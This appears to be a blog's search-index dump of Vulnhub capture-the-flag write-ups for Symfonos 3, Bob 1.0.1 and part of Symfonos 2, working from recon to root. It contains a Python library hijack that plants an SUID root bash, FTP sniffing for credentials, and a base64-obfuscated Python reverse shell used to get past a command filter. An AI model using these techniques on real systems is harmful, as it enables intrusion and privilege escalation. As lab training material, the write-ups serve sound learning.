PID=10527 | /usr/sbin/CRON -f 2022/02/04 00:41:01 CMD: UID=0 PID=10528 | /bin/sh -c /usr/bin/curl --silent -I 127.0.0.1 &amp;gt; /opt/ftpclient/statuscheck.txt 2022/02/04 00:41:25 CMD: UID=0 PID=10529 | /bin/sh /sbin/dhclient-script 2022/02/04 00:41:25 CMD: UID=0 PID=10530 | run-parts --list /etc/dhcp/dhclient-enter-hooks.d 2022/02/04 00:41:25 CMD: UID=0 PID=10531 | /bin/sh /sbin/dhclient-script 2022/02/04 00:42:01 CMD: UID=0 PID=10533 | /usr/sbin/CRON -f 2022/02/04 00:42:01 CMD: UID=0 PID=10532 | /usr/sbin/cron -f 2022/02/04 00:42:01 CMD: UID=0 PID=10534 | /usr/sbin/CRON -f 2022/02/04 00:42:01 CMD: UID=0 PID=10535 | /usr/sbin/CRON -f 2022/02/04 00:42:01 CMD: UID=0 PID=10537 | /bin/sh -c /usr/bin/curl --silent -I 127.0.0.1 &amp;gt; /opt/ftpclient/statuscheck.txt 2022/02/04 00:42:01 CMD: UID=0 PID=10536 | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 2022/02/04 00:42:01 CMD: UID=0 PID=10538 | /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 2022/02/04 00:42:01 CMD: UID=0 PID=10539 | cp /bin/bash /tmp/rootbash 2022/02/04 00:42:01 CMD: UID=0 PID=10540 | sh -c cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash 2022/02/04 00:42:01 CMD: UID=0 PID=10541 | /usr/sbin/CRON -f 2022/02/04 00:42:01 CMD: UID=105 PID=10542 | /usr/sbin/sendmail -i -FCronDaemon -B8BITMIME -oem root 2022/02/04 00:42:01 CMD: UID=1000 PID=10543 | /usr/sbin/exim4 -Mc 1nFsID-0002k1-7a There are actually 2 cronjobs /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py Executed every 2 minute ftpclient.py could be accessing FTP, sniffing FTP traffic could reveal passwords /bin/sh -c /usr/bin/curl --silent -I 127.0.0.1 &amp;gt; /opt/ftpclient/statuscheck.txt Executed every minute Sniff FTP traffic w/ tcpdump # Specify Loopback Interface (127.0.0.1) cerberus@symfonos3:/var/log/proftpd$ tcpdump port 21 -i lo hades:PTpZTfU4vxgzvRBE Switch to hades w/ hades:PTpZTfU4vxgzvRBE Root - Via Cronjob + Python Hijacking Linpeas hades belongs to the gods group gods group has write access to the entire python library where python modules resides. Earlier, we used pspy64 to observe system processes, we saw cronjob executing a python script ftpclient.py, since we have write access to the entire /usr/lib directory, we can edit the module ftpclient.py is using, in order to spawn a root shell. This is called python hijacking, TryHackMe: Wonderland also has this View contents of /opt/ftpclient/ftpclient.py hades@symfonos3:/srv/ftp$ cat /opt/ftpclient/ftpclient.py import ftplib ftp = ftplib.FTP(&#39;127.0.0.1&#39;) ftp.login(user=&#39;hades&#39;, passwd=&#39;PTpZTfU4vxgzvRBE&#39;) ftp.cwd(&#39;/srv/ftp/&#39;) def upload(): filename = &#39;/opt/client/statuscheck.txt&#39; ftp.storbinary(&#39;STOR &#39;+filename, open(filename, &#39;rb&#39;)) ftp.quit() upload() ftplib module is imported View permissions of ftplib hades@symfonos3:/srv/ftp$ ls -l /usr/lib/python2.7 | grep ftp -rwxrw-r-- 1 root gods 37755 Sep 26 2018 ftplib.py -rwxrw-r-- 1 root gods 34438 Jul 19 2019 ftplib.pyc hades@symfonos3:/srv/ftp$ gods group have write access Edit ftplib to spawn a root shell # Make a backup of ftplib.py hades@symfonos3:/usr/lib/python2.7$ cp ftplib.py /tmp/ftplib.py.bak # Create python script to spawn a root shell hades@symfonos3:/usr/lib/python2.7$ nano /tmp/ftplib.py # See Screenshot # Replace malicious python script w/ actual python script hades@symfonos3:/tmp$ cp /tmp/ftplib.py /usr/lib/python2.7/ftplib.py Wait for cronjob to execute hades@symfonos3:/tmp$ ls -l total 4988 -rw-r--r-- 1 hades hades 76 Feb 4 00:20 ftplib.py -rwxr--r-- 1 hades hades 37755 Feb 4 00:17 ftplib.py.bak -rw-r--r-- 1 hades hades 113360 Feb 3 23:42 hades.out -rw-r--r-- 1 cerberus cerberus 113874 Feb 3 22:39 linpeas.out -rwxrwxrwx 1 cerberus cerberus 762836 Feb 3 22:38 linpeas.sh -rwxr-xr-x 1 cerberus cerberus 3078592 Feb 3 23:33 pspy64 -rwsr-xr-x 1 root root 975488 Feb 4 00:24 rootbash # Rootshell drwx------ 3 root root 4096 Feb 3 21:36 systemd-private-32c5effdfe964eecbf53b94cec555765-apache2.service-CbKte3 drwx------ 3 root root 4096 Feb 3 21:36 systemd-private-32c5effdfe964eecbf53b94cec555765-systemd-timesyncd.service-8gPZoY -rw-r--r-- 1 hades hades 0 Feb 4 00:18 test hades@symfonos3:/tmp$ Obtain root shell hades@symfonos3:/tmp$ /tmp/rootbash -p Root Flag rootbash-4.2# cd /root rootbash-4.2# ls proof.txt rootbash-4.2# cat proof.txt Congrats on rooting symfonos:3! _._ _/,__\\, __/ _/o&#39;o / &#39;-.___&#39;/ __ /__ /\\ )__/_))\\ /_/, __,____ // &#39;-.____|--&#39; \\\\ e,e / // /___/| |/ \\/\\ \\\\ &#39;o /))) : \\___\\| / , \\/ \\\\ -&#39; \\\\__,_/| \\/ / \\ \\\\ \\_\\| \\/ \\ \\\\ | || &amp;lt; &#39;_ \\ \\\\ | || / ,| / / \\\\ | || | / | /\\ \\\\ | || \\_/ | | | \\\\ | ||_______________,&#39; |__/ \\ \\\\ \\|/_______________\\___/______\\_ \\\\ \\________________________ \\__ \\\\ ___ \\________________________ _\\_____ \\\\ _____/ \\________________________ \\\\ ~~~~~~~ / ~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~~ ~~~~\\\\~~~~ ~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ // Contact me via Twitter @zayotic to give feedback! rootbash-4.2# View cronjobs ``` root@symfonos3:/opt# crontab -l @reboot /sbin/dhclient -nw /usr/bin/curl –silent -I 127.0.0.1 &amp;gt; /opt/ftpclient/statuscheck.txt */2 * * * * /usr/bin/python2.7 /opt/ftpclient/ftpclient.py root@symfonos3:/opt# ``` " }, { "title": "Vulnhub - Bob 1.0.1", "url": "/posts/Bob-1.0.1/", "categories": "Vulnhub, Linux", "tags": "exploit/command-injection, bash-bypass, linux-priv-esc/linux-creds-found", "date": "2022-02-05 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Sat Jan 22 15:05:40 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Bob1.0.1/192.168.236.5/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Bob1.0.1/192.168.236.5/scans/xml/_full_tcp_nmap.xml 192.168.236.5mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversadjust_timeouts2: packet supposedly had rtt of -919297 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -919297 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -919297 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -919297 microseconds. Ignoring time.Nmap scan report for 192.168.236.5Host is up, received arp-response (0.00064s latency).Scanned at 2022-01-22 15:05:41 +08 for 18sNot shown: 65533 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))| http-robots.txt: 4 disallowed entries | /login.php /dev_shell.php /lat_memo.html |_/passwords.html|_http-title: Site doesn&#39;t have a title (text/html).| http-methods: |_ Supported Methods: POST OPTIONS HEAD GET|_http-server-header: Apache/2.4.25 (Debian)25468/tcp open ssh syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)| ssh-hostkey: | 2048 84:f2:f8:e5:ed:3e:14:f3:93:d4:1e:4c:41:3b:a2:a9 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCt2rmQKSTx+fbTOy3a0DG0GI5KOP+x81YHI31kH8V+gXu+BhrvzTtvQbg/KUaxkxNXirQKm3v23b/BNGLm2EmG28T8H1kisT5LhmfJ+w1X/Y7xnXiTYxwxKWF8NHMsQGIKWB8bCPK+2LvG3MdF6cKniSIiT8C8N66F6yTPQyuW9z68pK7Zj4wm0nrkvQ9Mr++Kj4A4WIhxaYd0+hPnSUNIGLr+XC7mRVUtDSvfP0RqguibeQ2yoB974ZTF0uU0Zpq7BK8/loAl4nFu/6vwLU7BjYm3BlU3fvjDNlSwqbsjwgn/kTfySxZ/WiifZW3U1WLLdY4CQZ++nR2odDNy8YQb| 256 5b:98:c7:4f:84:6e:fd:56:6a:35:16:83:aa:9c:ea:f8 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIntdI8IcX2n63A3tEIasPt0W0Lg31IAVGyzesYMblJsc1zM1jmaJ9d6w6PpZKa+7Ow/5yXX2DOF03pAHXP1S5A=| 256 39:16:56:fb:4e:0f:50:85:40:d3:53:22:41:43:38:15 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMmbgZpOuy0D5idStSgBUVb4JjRuAdv/7XF5dGDJgUqEMAC Address: 08:00:27:F6:19:B5 (Oracle VirtualBox virtual NIC)OS fingerprint not ideal because: Didn&#39;t receive UDP response. Please try again with -sSUAggressive OS guesses: Linux 3.2 - 4.9 (96%), Linux 3.13 (93%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (93%), Linux 4.10 (93%), Linux 3.2 - 3.10 (92%), Linux 3.2 - 3.16 (92%), Linux 3.10 - 4.11 (92%), Linux 3.16 - 4.6 (91%), Linux 2.6.32 (91%), Linux 2.6.32 - 3.10 (90%)No exact OS matches for host (test conditions non-ideal).TCP/IP fingerprint:SCAN(V=7.92%E=4%D=1/22%OT=80%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61EBACD7%P=x86_64-pc-linux-gnu)SEQ(TI=Z%CI=I%II=I%TS=8)SEQ(SP=105%GCD=3%ISR=104%TI=Z%CI=RD%II=I%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=N)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%TG=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 198.839 days (since Wed Jul 7 18:58:16 2021)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=261 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.64 ms 192.168.236.5Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Jan 22 15:05:59 2022 -- 1 IP address (1 host up) scanned in 19.42 secondsNMAP tcp/80 tcp/25468 (SSH)TCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/Bob1.0.1]└─# ffuf -u http://192.168.236.5/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &quot;.html,.txt,.php&quot; -fw 22 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________:: Method : GET:: URL : http://192.168.236.5/FUZZ:: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt:: Extensions : .html .txt .php :: Follow redirects : false:: Calibration : false:: Timeout : 10:: Threads : 40:: Matcher : Response status: 200,204,301,302,307,401,403,405:: Filter : Response words: 22________________________________________________about.html [Status: 200, Size: 2579, Words: 687, Lines: 91]contact.html [Status: 200, Size: 3145, Words: 1078, Lines: 149]index.html [Status: 200, Size: 1425, Words: 413, Lines: 70]login.html [Status: 200, Size: 1560, Words: 442, Lines: 74]news.html [Status: 200, Size: 4086, Words: 1168, Lines: 153]passwords.html [Status: 200, Size: 673, Words: 103, Lines: 31]robots.txt [Status: 200, Size: 111, Words: 6, Lines: 6]:: Progress: [18460/18460] :: Job [1/1] :: 217 req/sec :: Duration: [0:00:04] :: Errors: 0 :: passwords.html robots.txtInitial FootholdTCP/80 (HTTP) View robots.txt ┌──(root💀kali)-[~/vulnHub/Bob1.0.1] └─# curl http://192.168.236.5/robots.txt User-agent: * Disallow: /login.php Disallow: /dev_shell.php Disallow: /lat_memo.html Disallow: /passwords.html Proceed to enumerated directories /login.php ┌──(root💀kali)-[~/vulnHub/Bob1.0.1] └─# curl http://192.168.236.5/login.php &amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt; &amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt; &amp;lt;p&amp;gt;The requested URL /login.php was not found on this server.&amp;lt;/p&amp;gt; &amp;lt;hr&amp;gt; &amp;lt;address&amp;gt;Apache/2.4.25 (Debian) Server at 192.168.236.5 Port 80&amp;lt;/address&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; /dev_shell.php /lat_memo.html “Webshell running on the server, ported over the filter from the old windows server” /passwords.html Proceed to login.html Disabled Proceed to /dev_shell.php, figure out words that are filtered Start HTTP Server Download the files &amp;amp; analyze the source code ┌──(root💀kali)-[~/vulnHub/Bob1.0.1/192.168.236.5/loot] └─# wget 192.168.236.5:8181/dev_shell.php --2022-01-22 15:44:26-- http://192.168.236.5:8181/dev_shell.php Connecting to 192.168.236.5:8181... connected. HTTP request sent, awaiting response... 200 OK Length: 1396 (1.4K) [application/octet-stream] Saving to: ‘dev_shell.php’ dev_shell.php 100%[==============================================&amp;gt;] 1.36K --.-KB/s in 0s 2022-01-22 15:44:26 (229 MB/s) - ‘dev_shell.php’ saved [1396/1396] Filtered &quot;pwd&quot;, &quot;ls&quot;, &quot;netcat&quot;, &quot;ssh&quot;, &quot;wget&quot;, &quot;ping&quot;, &quot;traceroute&quot;, &quot;cat&quot;, &quot;nc&quot;,&quot;;&quot; Bypass filter by encoding payload Encode Payload Final Payload echo -n cHl0aG9uIC1jICdhPV9faW1wb3J0X187cz1hKCJzb2NrZXQiKS5zb2NrZXQ7bz1hKCJvcyIpLmR1cDI7cD1hKCJwdHkiKS5zcGF3bjtjPXMoKTtjLmNvbm5lY3QoKCIxOTIuMTY4LjIzNi40Iiw0NDQ0KSk7Zj1jLmZpbGVubztvKGYoKSwwKTtvKGYoKSwxKTtvKGYoKSwyKTtwKCIvYmluL3NoIikn | base64 -d | sh Obtain www-data shell ┌──(root💀kali)-[~/vulnHub/Bob1.0.1/192.168.236.5/loot/http] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 192.168.236.5. Ncat: Connection from 192.168.236.5:57636. $ whoami whoami www-data Privilege EscalationElliot - Via Creds Found Look for .txt &amp;amp; pass files in /home www-data@Milburg-High:/home$ find $(pwd) 2&amp;gt;/dev/null | grep -P &quot;.txt|pass&quot; /home/bob/.old_passwordfile.html /home/bob/Documents/staff.txt /home/bob/Documents/login.txt.gpg .... /home/elliot/theadminisdumb.txt View enumerated files .old_passwordfile.html www-data@Milburg-High:/$ more /home/bob/.old_passwordfile.html &amp;lt;html&amp;gt; &amp;lt;p&amp;gt; jc:Qwerty seb:T1tanium_Pa$$word_Hack3rs_Fear_M3 &amp;lt;/p&amp;gt; &amp;lt;/html&amp;gt; seb:T1tanium_Pa$$word_Hack3rs_Fear_M3 jc:Qwerty /home/bob/Documents/staff.txt www-data@Milburg-High:/home$ cat /home/bob/Documents/staff.txt Seb: Seems to like Elliot Wants to do well at his job Gave me a backdoored FTP to instal that apparently Elliot gave him James: Does nothing Pretty Lazy Doesn&#39;t give a shit about his job Elliot: Keeps to himself Always needs to challenge everything I do Keep an eye on him Try and get him fired /home/bob/Documents/login.txt.gpg www-data:/$ more /home/bob/Documents/login.txt.gpg o��J[V0w�q�OS�bob@Milburg-High:/$ file /home/bob/Documents/login.txt.gpg /home/bob/Documents/login.txt.gpg: GPG symmetrically encrypted data (AES cipher) bob@Milburg-High:/$ symmetrically encrypted, no need for private key, only passphrase needed. /home/elliot/theadminisdumb.txt www-data@Milburg-High:/home$ cat /home/elliot/theadminisdumb.txt The admin is dumb,.........SNIP theadminisdumb elliot:theadminisdumb Switch to seb, jc, elliot, could not enumerate/find ways to root Proceed to /home/bob/Documents jc@Milburg-High:~/Documents$ ls -la total 20 drwxr-xr-x 3 bob bob 4096 Mar 5 2018 . drwxr-xr-x 18 bob bob 4096 Mar 8 2018 .. -rw-r--r-- 1 bob bob 91 Mar 5 2018 login.txt.gpg drwxr-xr-x 3 bob bob 4096 Mar 5 2018 Secret -rw-r--r-- 1 bob bob 300 Mar 4 2018 staff.txt Look for suspicious files jc@Milburg-High:~/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ sh notes.sh -= Notes =- Harry Potter is my faviorite Are you the real me? Right, I&#39;m ordering pizza this is going nowhere People just don&#39;t get me Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh &amp;lt;sea santy here&amp;gt; Cucumber Rest now your eyes are sleepy Are you gonna stop reading this yet? Time to fix the server Everyone is annoying Sticky notes gotta buy em bob@Milburg-High:~/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ HARPOCRATES Decrypt login.txt.gpg jc@Milburg-High:/tmp$ gpg --decrypt /home/bob/Documents/login.txt.gpg gpg: AES encrypted data gpg: problem with the agent: Permission denied &amp;lt;-- ERROR gpg: encrypted with 1 passphrase gpg: decryption failed: No secret key bob@Milburg-High:/tmp$ gpg --decrypt /home/bob/Documents/login.txt.gpg^C jc@Milburg-High:/tmp$ gpg --decrypt --pinentry-mode=loopback /home/bob/Documents/login.txt.gpg gpg: AES encrypted data gpg: encrypted with 1 passphrase bob:b0bcat_ bob@Milburg-High:/tmp$ ls # OR jc@Milburg-High:/tmp$ gpg --batch --passphrase HARPOCRATES -d /home/bob/Documents/login.txt.gpg gpg: AES encrypted data gpg: encrypted with 1 passphrase bob:b0bcat_ bob:b0bcat_ Fix the error: https://askubuntu.com/questions/1080204/gpg-problem-with-the-agent-permission-denied Switch to bob w/ bob:b0bcat_ Root - Via Sudo Check sudo access bob@Milburg-High:/tmp$ sudo -l sudo: unable to resolve host Milburg-High: Connection refused [sudo] password for bob: Matching Defaults entries for bob on Milburg-High: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User bob may run the following commands on Milburg-High: (ALL : ALL) ALL bob@Milburg-High:/tmp$ Obtain root shell Flag root@Milburg-High:/# cat flag.txt CONGRATS ON GAINING ROOT .-. ( ) |~| _.--._ |~|~:&#39;--~&#39; | | | : #root | | | : _.--._| |~|~`&#39;--~&#39; | | | | | | | | | | | | | | | | | | _____|_|_________ Thanks for playing ~c0rruptedb1t " }, { "title": "Vulnhub - Symfonos 2", "url": "/posts/Symfonos-2/", "categories": "Vulnhub, Linux", "tags": "tcp/22-ftp/exploit, pivot, tcp/80-http/web-app-cms-exploit, linux-priv-esc/sudo/gtfo-bin", "date": "2022-02-04 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Sun Jan 23 22:38:50 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Symfonos-2/192.168.236.7/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Symfonos-2/192.168.236.7/scans/xml/_full_tcp_nmap.xml 192.168.236.7mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversNmap scan report for 192.168.236.7Host is up, received arp-response (0.00050s latency).Scanned at 2022-01-23 22:38:51 +08 for 28sNot shown: 65530 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack ttl 64 ProFTPD 1.3.522/tcp open ssh syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: | 2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Cvyjh+QnQHsoZt3FqnW8JazNn1CYvc7uuArLkDPM25xV8l4Jc7Xw9InhmSFKJJD0mXhLALt/9byLeH7CyBEjpKATbSsEIL1iQ7G7ETmuOdZPfZxRnLhmaf1cvUxLapJQ5B3z67VR0PxvjfDk/0ARPAhKu1CuPmZk/y4t2iu8RKHG86j5jzR0KO3o2Aqsb2j+7XOd4IDCSFuoFiP3Eic/Jydtv73pyo+2JxBUvTSLaEtqe1op8sLP8wBFRX4Tvmqz/6zO1/zivBjBph8XMlzuMkMC8la8/XJmPb8U5C/8zfogG+YwycTw6ul7616PIj2ogPP89uyrTX9dM3RuZ9/1| 256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKXypIGuum1SlMddq/BrUwIZM1sRIgbzdijCa1zYunAAT+uKTwPGaKO7e9RxYu97+ygLgpuRMthojpUlOgOVGOA=| 256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILluhq57UWA4q/mo/h6CjqWMpMOYB9VjtvBrHc6JsEGk80/tcp open http syn-ack ttl 64 WebFS httpd 1.21|_http-server-header: webfs/1.21|_http-title: Site doesn&#39;t have a title (text/html).| http-methods: |_ Supported Methods: GET HEAD139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)MAC Address: 08:00:27:BB:18:ED (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=1/23%OT=21%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61EOS:D6897%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=8OS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5BOS:4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120OS:)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%OS:Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1OS:(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 0.002 days (since Sun Jan 23 22:37:09 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=260 (Good luck!)IP ID Sequence Generation: All zerosService Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 9h59m59s, deviation: 3h27m50s, median: 7h59m59s| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 57573/tcp): CLEAN (Couldn&#39;t connect)| Check 2 (port 46951/tcp): CLEAN (Couldn&#39;t connect)| Check 3 (port 30418/udp): CLEAN (Timeout)| Check 4 (port 19386/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)| Names:| SYMFONOS2&amp;lt;00&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| SYMFONOS2&amp;lt;03&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| SYMFONOS2&amp;lt;20&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| \\x01\\x02__MSBROWSE__\\x02&amp;lt;01&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;00&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;1d&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;1e&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| Statistics:| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00|_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required| smb2-time: | date: 2022-01-23T22:39:08|_ start_date: N/A| smb-os-discovery: | OS: Windows 6.1 (Samba 4.5.16-Debian)| Computer name: symfonos2| NetBIOS computer name: SYMFONOS2\\x00| Domain name: \\x00| FQDN: symfonos2|_ System time: 2022-01-23T16:39:08-06:00TRACEROUTEHOP RTT ADDRESS1 0.50 ms 192.168.236.7Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Jan 23 22:39:19 2022 -- 1 IP address (1 host up) scanned in 29.66 secondsTCP/21 (FTP)NMAP Scan┌──(root💀kali)-[~/vulnHub/Symfonos-2]└─# nmap -vv --reason -Pn -T4 -sV -p 21 &quot;--script=banner,(ftp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)&quot;PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack ttl 64 ProFTPD 1.3.5| banner: 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.16|_8.236.7]MAC Address: 08:00:27:BB:18:ED (Oracle VirtualBox virtual NIC)Service Info: OS: Unix ProFTPD 1.3.5 Exploited before @ TryHackMe: Kenobi Anonymous access deniedTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/Symfonos-2]└─# ffuf -u http://192.168.236.7/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.sql,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.236.7/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .sql .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________ [Status: 200, Size: 183, Words: 18, Lines: 15]index.html [Status: 200, Size: 183, Words: 18, Lines: 15]:: Progress: [23075/23075] :: Job [1/1] :: 5603 req/sec :: Duration: [0:00:05] :: Errors: 0 :: index.htmlNikto┌──(root💀kali)-[~/vulnHub/Symfonos-2]└─# nikto -ask=no -h http://192.168.236.7:80 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/Symfonos-2/192.168.236.7/scans/tcp80/tcp_80_http_nikto.txt&quot;- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.236.7+ Target Hostname: 192.168.236.7+ Target Port: 80+ 